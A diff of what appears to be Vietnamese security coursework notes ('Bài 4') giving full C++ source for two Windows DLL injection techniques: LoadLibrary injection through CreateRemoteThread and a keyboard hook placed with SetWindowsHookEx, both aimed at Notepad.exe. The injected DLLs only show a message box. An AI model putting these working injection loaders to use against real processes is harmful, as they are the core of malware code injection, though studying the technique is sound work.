@@ -130,124 +130,177 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 - Bài 4
   - LoadLibrary Injection:
-  
-  ```
-  #include<iostream>
-  #include<windows.h>
-  #include<fstream>
-  #include<TlHelp32.h>
-  #include<wchar.h>
-  #include<string>
-  #include"Resource1.h"
-  using namespace std;
-  int main()
-  {
-      HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_DLL1), "dll");
-      HGLOBAL hResData = LoadResource(NULL, hRes);
-      void* pDllBuffer = LockResource(hResData);
-      DWORD dwSize = SizeofResource(NULL, hRes);
-      ofstream dllFile("temp.dll", ios::binary);
-      dllFile.write((char*)pDllBuffer, dwSize);
-      dllFile.close();
-      char path[MAX_PATH];
-      GetModuleFileNameA(NULL, path, MAX_PATH);
-      string strPath = string(path);
-      size_t pos = strPath.find_last_of("\\/");
-      if (std::string::npos != pos)
-      {
-          strPath = strPath.substr(0, pos);
-      }
-      strPath.append("\\temp.dll");
-      const char* pathDll = strPath.c_str();
-      while (TRUE)
-      {
-          PROCESSENTRY32 pe32;
-          pe32.dwSize = sizeof(pe32);
-          HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-          bool check = Process32First(hProcess, &pe32);
-          while (check != FALSE)
-          {
-              if (strcmp(pe32.szExeFile, "Notepad.exe") == 0)
-              {
-                  HANDLE processHandle;
-                  PVOID remoteBuffer;
-                  processHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pe32.th32ProcessID);
-                  remoteBuffer = VirtualAllocEx(processHandle, NULL, strlen(pathDll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                  auto h = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)pathDll, strlen(pathDll) + 1, NULL);
-                  PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
-                  CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
-                  CloseHandle(processHandle);
-                  return 0;
-              }
-              check = Process32Next(hProcess, &pe32);
-          }
-          CloseHandle(hProcess);
-      }
-  }
 
-  ```
+    - File Dll
+   
+    ```
+    #include "pch.h"
+    BOOL APIENTRY DllMain( HMODULE hModule,
+                           DWORD  ul_reason_for_call,
+                           LPVOID lpReserved
+                         )
+    {
+        switch (ul_reason_for_call)
+        {
+        case DLL_PROCESS_ATTACH:
+            MessageBoxExA(NULL, "Warnning!", "Dll Inject!", MB_OK, NULL);
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+        }
+        return TRUE;
+    }
+    ``` 
+
+    - File exe
+    
+    ```
+    #include<iostream>
+    #include<windows.h>
+    #include<fstream>
+    #include<TlHelp32.h>
+    #include<wchar.h>
+    #include<string>
+    #include"Resource1.h"
+    using namespace std;
+    int main()
+    {
+        HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCE(IDR_DLL1), "dll");
+        HGLOBAL hResData = LoadResource(NULL, hRes);
+        void* pDllBuffer = LockResource(hResData);
+        DWORD dwSize = SizeofResource(NULL, hRes);
+        ofstream dllFile("temp.dll", ios::binary);
+        dllFile.write((char*)pDllBuffer, dwSize);
+        dllFile.close();
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        string strPath = string(path);
+        size_t pos = strPath.find_last_of("\\/");
+        if (std::string::npos != pos)
+        {
+            strPath = strPath.substr(0, pos);
+        }
+        strPath.append("\\temp.dll");
+        const char* pathDll = strPath.c_str();
+        while (TRUE)
+        {
+            PROCESSENTRY32 pe32;
+            pe32.dwSize = sizeof(pe32);
+            HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            bool check = Process32First(hProcess, &pe32);
+            while (check != FALSE)
+            {
+                if (strcmp(pe32.szExeFile, "Notepad.exe") == 0)
+                {
+                    HANDLE processHandle;
+                    PVOID remoteBuffer;
+                    processHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pe32.th32ProcessID);
+                    remoteBuffer = VirtualAllocEx(processHandle, NULL, strlen(pathDll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                    auto h = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)pathDll, strlen(pathDll) + 1, NULL);
+                    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
+                    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+                    CloseHandle(processHandle);
+                    return 0;
+                }
+                check = Process32Next(hProcess, &pe32);
+            }
+            CloseHandle(hProcess);
+        }
+    }
+  
+    ```
   
   - SetWindowsHookEx:
-  
-  ```
-  #include<iostream>
-  #include<windows.h>
-  #include<fstream>
-  #include<Tlhelp32.h>
-  #include"resource.h"
-  using namespace std;
-  int main()
-  {
-      HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
-      HGLOBAL hResData = LoadResource(NULL, hRes);
-      void* pDllBuffer = LockResource(hResData);
-      DWORD dwSize = SizeofResource(NULL, hRes);
-      ofstream dllFile("temp.dll", ios::binary);
-      dllFile.write((char*)pDllBuffer, dwSize);
-      dllFile.close();
-      char path[MAX_PATH];
-      GetModuleFileNameA(NULL, path, MAX_PATH);
-      string strPath = string(path);
-      size_t pos = strPath.find_last_of("\\/");
-      if (std::string::npos != pos)
-      {
-          strPath = strPath.substr(0, pos);
-      }
-      strPath.append("\\temp.dll");
-      const char* pathDll = strPath.c_str();
-      while (TRUE)
-      {
-          DWORD pid = 0;
-          PROCESSENTRY32 pe32;
-          pe32.dwSize = sizeof(pe32);
-          HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-          bool check1 = Process32First(hProcess, &pe32);
-          while (check1 != FALSE)
-          {
-              if (wcscmp(pe32.szExeFile, L"Notepad.exe") == 0)
-              {
-                  pid = pe32.th32ProcessID;
-                  break;
-              }
-              check1 = Process32Next(hProcess, &pe32);
-          }
-          DWORD tid = 0;
-          THREADENTRY32 te32;
-          HANDLE hThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
-          te32.dwSize = sizeof(te32);
-          bool check2 = Thread32First(hThread, &te32);
-          while (check2 != FALSE)
-          {
-              if (te32.th32OwnerProcessID == pid)
-              {
-                  tid = te32.th32ThreadID;
-                  break;
-              }
-              check2 = Thread32Next(hThread, &te32);
-          }
-          HINSTANCE hDll;
-          hDll = LoadLibraryA(pathDll);
-          HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)GetProcAddress(hDll, "Hook"), hDll, tid);
-      }
-  }
-  ```
+ 
+    - File dll
+   
+    ```
+    #include "pch.h"
+    extern "C" __declspec(dllexport) int Hook()
+    {
+        MessageBoxA(NULL, "Inject!", "Warnning!", MB_OK);
+        return 0;
+    }
+    BOOL APIENTRY DllMain( HMODULE hModule,
+                           DWORD  ul_reason_for_call,
+                           LPVOID lpReserved
+                         )
+    {
+        switch (ul_reason_for_call)
+        {
+        case DLL_PROCESS_ATTACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+        }
+        return TRUE;
+    }
+    ``` 
+ 
+    - File exe
+
+    ```
+    #include<iostream>
+    #include<windows.h>
+    #include<fstream>
+    #include<Tlhelp32.h>
+    #include"resource.h"
+    using namespace std;
+    int main()
+    {
+        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
+        HGLOBAL hResData = LoadResource(NULL, hRes);
+        void* pDllBuffer = LockResource(hResData);
+        DWORD dwSize = SizeofResource(NULL, hRes);
+        ofstream dllFile("temp.dll", ios::binary);
+        dllFile.write((char*)pDllBuffer, dwSize);
+        dllFile.close();
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        string strPath = string(path);
+        size_t pos = strPath.find_last_of("\\/");
+        if (std::string::npos != pos)
+        {
+            strPath = strPath.substr(0, pos);
+        }
+        strPath.append("\\temp.dll");
+        const char* pathDll = strPath.c_str();
+        while (TRUE)
+        {
+            DWORD pid = 0;
+            PROCESSENTRY32 pe32;
+            pe32.dwSize = sizeof(pe32);
+            HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+            bool check1 = Process32First(hProcess, &pe32);
+            while (check1 != FALSE)
+            {
+                if (wcscmp(pe32.szExeFile, L"Notepad.exe") == 0)
+                {
+                    pid = pe32.th32ProcessID;
+                    break;
+                }
+                check1 = Process32Next(hProcess, &pe32);
+            }
+            DWORD tid = 0;
+            THREADENTRY32 te32;
+            HANDLE hThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+            te32.dwSize = sizeof(te32);
+            bool check2 = Thread32First(hThread, &te32);
+            while (check2 != FALSE)
+            {
+                if (te32.th32OwnerProcessID == pid)
+                {
+                    tid = te32.th32ThreadID;
+                    break;
+                }
+                check2 = Thread32Next(hThread, &te32);
+            }
+            HINSTANCE hDll;
+            hDll = LoadLibraryA(pathDll);
+            HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)GetProcAddress(hDll, "Hook"), hDll, tid);
+        }
+    }
+    ```
